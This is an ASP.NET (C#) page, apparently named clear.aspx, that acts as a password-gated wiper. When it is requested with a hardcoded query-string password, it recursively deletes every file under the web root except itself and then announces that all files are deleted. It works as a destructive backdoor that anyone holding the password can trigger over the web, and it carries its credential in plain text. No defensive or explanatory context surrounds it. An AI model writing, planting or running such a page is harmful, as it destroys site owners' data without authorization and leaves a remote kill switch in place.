<%@ Page Language="C#" %>
<%
    string password = "Lunamaro@123";
    
    if (Request.QueryString["pass"] != password) {
        Response.Write("Access denied");
        Response.End();
    }

    void DeleteFilesOnly(string dir) {
        foreach (string file in System.IO.Directory.GetFiles(dir)) {
            if (System.IO.Path.GetFileName(file) != "clear.aspx") {
                System.IO.File.Delete(file);
            }
        }
        foreach (string subDir in System.IO.Directory.GetDirectories(dir)) {
            DeleteFilesOnly(subDir);
        }
    }

    DeleteFilesOnly(Server.MapPath("~/"));
    Response.Write("✅ All files deleted. Folders kept safe.");
%>